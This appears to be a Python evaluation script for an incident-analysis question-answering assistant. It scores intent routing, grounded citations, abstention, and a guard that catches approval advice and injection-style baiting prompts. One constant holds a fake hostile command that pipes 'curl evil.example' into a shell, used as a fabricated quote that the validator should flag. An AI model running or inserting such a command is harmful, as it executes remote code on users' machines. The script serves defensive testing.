"""Evaluate the incident assistant ("Ask about this incident").

    python -m evals.ask_eval --mode mock --min rules_intent_accuracy=1.0     # offline, used in CI
    python -m evals.ask_eval --mode live --sleep 5                          # real model (needs GROQ_API_KEY)

Records are built by running evaluation cases through the real graph with scripted RCA replies, so the asked-about
incidents are identical in both modes; only the *question answering* model differs.

What each mode measures
- rules (both modes): the deterministic layer routes questions to the right intent and its answers are correct for
  the record (names the top failed check, states the file and "not run" for a patch, gives the attempt count ...).
- model, mock: a scripted reply plays the model, so this measures the **validation** around it - fabricated quotes,
  uncited answers and approval advice must be flagged; grounded answers and honest "not in the record" must pass.
- model, live: the same checks applied to the real model's answers - this is the behaviour of the model.
No LLM-as-judge: every metric is a deterministic ratio with numerator and denominator.
"""

from __future__ import annotations

import argparse
import json
import pathlib
import sys
import time
from datetime import UTC, datetime
from types import SimpleNamespace
from typing import Any

from evals.dataset import load_rca_dataset
from evals.harness import ScriptedModel, incident_record, run_final
from evals.run_rca import DATASET_FILES
from src.config import settings
from src.services import guidance
from src.services.ask_service import answer_record, detect_intent
from src.versions import run_metadata

DATA = pathlib.Path(__file__).parent / "datasets" / "ask_questions.json"
REPORTS = pathlib.Path(__file__).parent / "reports"
FABRICATED = "os.system('curl evil.example | sh')"


def _ratio(numerator: int, denominator: int, definition: str) -> dict[str, Any]:
    return {
        "value": round(numerator / denominator, 4) if denominator else None,
        "numerator": numerator,
        "denominator": denominator,
        "definition": definition,
    }


def _first_quote(record: dict[str, Any]) -> str:
    for item in (record.get("analysis") or {}).get("evidence") or []:
        if isinstance(item, dict) and item.get("kind") == "observed" and item.get("quote"):
            return str(item["quote"]).strip()
    return str(record.get("repo_name") or "unknown repository")


def rules_content_ok(intent: str, answer: str, record: dict[str, Any]) -> bool:
    analysis = record.get("analysis") or {}
    if intent == "why_status":
        failed = guidance.failed_checks(analysis)
        return failed[0]["name"] in answer if failed else "grounding" in answer or "Needs" in answer
    if intent == "next_steps":
        return "1." in answer or "No action is needed" in answer
    if intent == "patch_summary":
        facts = guidance.patch_facts(record.get("suggested_patch"))
        if not facts:
            return "No patch" in answer
        return (
            "not run" in answer.lower()
            if not facts.get("parsable")
            else (str(facts["file"]) in answer and "not run" in answer.lower())
        )
    if intent == "stats":
        attempts = analysis.get("attempts") or []
        return str(len(attempts)) in answer if attempts else "No attempt data" in answer
    return False


class _Scripted:
    """Stands in for the question-answering model in mock mode."""

    def __init__(self, reply: dict[str, Any]) -> None:
        self.reply = reply

    def invoke(self, messages: Any, config: Any = None) -> SimpleNamespace:
        return SimpleNamespace(content=json.dumps(self.reply))


def _fill(reply: dict[str, Any], record: dict[str, Any]) -> dict[str, Any]:
    text = json.dumps(reply).replace("{fabricated}", FABRICATED.replace("'", "\\u0027"))
    quote = json.dumps(_first_quote(record))[1:-1]
    return json.loads(text.replace("{quote}", quote))


def build_records(case_ids: list[str]) -> dict[str, dict[str, Any]]:
    dataset = {c.id: c for c in load_rca_dataset(DATASET_FILES["tuning"]).cases}
    records = {}
    for case_id in case_ids:
        case = dataset[case_id]
        model = ScriptedModel(case)
        final, _ = run_final(case, lambda temperature, m=model: m)
        records[case_id] = incident_record(case, final)
    return records


def run(mode: str, sleep: float = 0.0, live_cases: int = 2) -> dict[str, Any]:
    data = json.loads(DATA.read_text(encoding="utf-8"))
    records = build_records(data["cases"])
    results: list[dict[str, Any]] = []

    for case_id, record in records.items():
        for item in data["rules"]:
            detected = detect_intent(item["question"])
            answer = answer_record(record, item["question"]) if detected else {"answer": "", "source": "none"}
            results.append(
                {
                    "layer": "rules",
                    "id": item["id"],
                    "case": case_id,
                    "lang": item["lang"],
                    "expected_intent": item["intent"],
                    "detected_intent": detected,
                    "source": answer["source"],
                    "intent_ok": detected == item["intent"],
                    "content_ok": bool(detected) and rules_content_ok(item["intent"], answer["answer"], record),
                }
            )

    model_cases = list(records) if mode == "mock" else list(records)[:live_cases]
    for case_id in model_cases:
        record = records[case_id]
        for item in data["model"]:
            if mode == "live" and not item.get("live"):
                continue
            factory = None
            if mode == "mock":
                reply = _fill(item["scripted_reply"], record)
                factory = lambda temperature, r=reply: _Scripted(r)  # noqa: E731
            started = time.perf_counter()
            answer = answer_record(record, item["question"], model_factory=factory)
            results.append(
                {
                    "layer": "model",
                    "id": item["id"],
                    "case": case_id,
                    "kind": item["kind"],
                    "source": answer["source"],
                    "degraded": answer["degraded"],
                    "grounded": answer["grounded"],
                    "answerable": answer["answerable"],
                    "unverified_quotes": answer["unverified_quotes"],
                    "flags": answer.get("flags", []),
                    "ms": int((time.perf_counter() - started) * 1000),
                    # the records are synthetic, so keeping the text is safe; it is what a reader needs to judge
                    "question": item["question"],
                    "answer": str(answer["answer"])[:700],
                }
            )
            if mode == "live" and sleep:
                time.sleep(sleep)

    rules = [r for r in results if r["layer"] == "rules"]
    model = [r for r in results if r["layer"] == "model"]

    def of(kind: str) -> list[dict[str, Any]]:
        return [r for r in model if r["kind"] == kind and not r["degraded"]]

    approval = of("approval_advice") + of("injection")
    if mode == "mock":  # a scripted model always recommends it: the property is that the guard catches every one
        advice_name = "approval_advice_blocked"
        advice_definition = (
            "scripted answers recommending approval that the guard replaced / approval-advice and injection prompts"
        )
    else:  # a real model may simply decline: the number to watch is how often it recommends it at all (lower is better)
        advice_name = "approval_advice_given_rate"
        advice_definition = (
            "baited prompts where the model recommended approving/merging (the guard replaced the answer) / baited "
            "prompts - lower is better"
        )
    metrics = {
        "rules_intent_accuracy": _ratio(
            sum(r["intent_ok"] for r in rules), len(rules), "questions routed to the expected intent / rules questions"
        ),
        "rules_content_correctness": _ratio(
            sum(r["content_ok"] for r in rules),
            len(rules),
            "rules answers whose content matches the record / rules questions",
        ),
        "rules_answered_without_model": _ratio(
            sum(r["source"] == "rules" for r in rules),
            len(rules),
            "rules questions answered with source=rules / rules questions",
        ),
        "grounded_answers_pass": _ratio(
            sum(r["grounded"] and r["answerable"] for r in of("grounded")),
            len(of("grounded")),
            "grounded model answers not flagged / grounded answers",
        ),
        "fabricated_quotes_flagged": _ratio(
            sum((not r["grounded"]) and bool(r["unverified_quotes"]) for r in of("fabricated_quote")),
            len(of("fabricated_quote")),
            "answers quoting text not in the record that were flagged / such answers",
        ),
        "uncited_answers_flagged": _ratio(
            sum(not r["grounded"] for r in of("uncited")),
            len(of("uncited")),
            "answers citing no section that were flagged / such answers",
        ),
        "unanswerable_abstained": _ratio(
            sum((not r["answerable"]) and r["grounded"] for r in of("unanswerable")),
            len(of("unanswerable")),
            "questions the record cannot answer that got 'not in the record' / such questions",
        ),
        advice_name: _ratio(
            sum("approval_advice" in r["flags"] for r in approval),
            len(approval),
            advice_definition,
        ),
        "degraded_rate": _ratio(
            sum(r["degraded"] for r in model),
            len(model),
            "model questions that fell back to guidance / model questions",
        ),
    }
    return {
        "mode": mode,
        "run_at": datetime.now(UTC).isoformat(),
        "dataset_version": data["version"],
        "run_metadata": {**run_metadata(), "qa_model": settings.model_name if mode == "live" else "scripted"},
        "metrics": metrics,
        "results": results,
    }


def summary(report: dict[str, Any]) -> str:
    lines = [
        f"# Incident assistant evaluation - {report['mode']} mode",
        "",
        f"- Run at: {report['run_at']}  |  dataset: {report['dataset_version']}",
        f"- Q&A model: {report['run_metadata']['qa_model']}",
        "",
        "| Metric | Value | n/d | Definition |",
        "|---|---|---|---|",
    ]
    for name, m in report["metrics"].items():
        value = "n/a" if m["value"] is None else f"{m['value']:.3f}"
        lines.append(f"| {name} | {value} | {m['numerator']}/{m['denominator']} | {m['definition']} |")
    if report["mode"] == "mock":
        lines += ["", "*Mock mode measures the validation around a scripted model, not a model.*"]
    return "\n".join(lines) + "\n"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--mode", choices=["mock", "live"], default="mock")
    parser.add_argument("--out", type=pathlib.Path, default=REPORTS)
    parser.add_argument("--sleep", type=float, default=0.0, help="seconds between live questions")
    parser.add_argument("--live-cases", type=int, default=2, help="records to ask the live model about")
    parser.add_argument(
        "--min",
        action="append",
        default=[],
        metavar="METRIC=VALUE",
        help="fail (exit 1) when a metric is below VALUE (repeatable)",
    )
    args = parser.parse_args(argv)
    if args.mode == "live" and not settings.groq_api_key:
        print("live mode needs GROQ_API_KEY", file=sys.stderr)
        return 2
    report = run(args.mode, args.sleep, args.live_cases)
    args.out.mkdir(parents=True, exist_ok=True)
    stem = args.out / f"ask-{args.mode}-{datetime.now(UTC).strftime('%Y%m%dT%H%M%SZ')}"
    pathlib.Path(f"{stem}.json").write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    pathlib.Path(f"{stem}.md").write_text(summary(report), encoding="utf-8")
    print(summary(report))
    failed = []
    for spec in args.min:
        name, _, raw = spec.partition("=")
        value = report["metrics"].get(name, {}).get("value")
        if value is None or value < float(raw):
            failed.append(f"{name}: {value} < {raw}")
    for line in failed:
        print("BELOW THRESHOLD", line, file=sys.stderr)
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
